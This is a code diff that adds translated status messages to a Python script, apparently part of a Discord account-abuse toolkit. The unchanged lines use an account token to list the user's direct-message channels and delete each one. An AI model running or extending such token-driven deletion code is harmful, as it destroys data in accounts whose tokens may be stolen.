@@ -1,5 +1,12 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
+
 try:
     import requests
     import threading
@@ -21,14 +28,14 @@ try:
         for channel in channels:
             try:
                 requests.delete(f'https://discord.com/api/v7/channels/'+channel['id'], headers={'Authorization': token})
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ADD} Status: {color.WHITE}Delete{color.RED} | Channel: {color.WHITE}{channel['id']}")
+                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {secondary}{tr('Delete')}{primary} | {tr('Channel')}: {color.WHITE}{channel['id']}")
             except Exception as e:
-                print(f"{invalid}[{secondary}{current_time_hour()}{invalid}] {ERROR} Status: {color.WHITE}Error: {e}{color.RED}")
+                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {secondary}{tr('Error')}: {e}{primary}")
 
     processes = []
     channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers={'Authorization': token}).json()
     if not channel_id:
-        print(f"{INFO} No Dm found.")
+        print(f"{INFO} {tr('NoDm')}.")
         Continue()
         Reset()
 
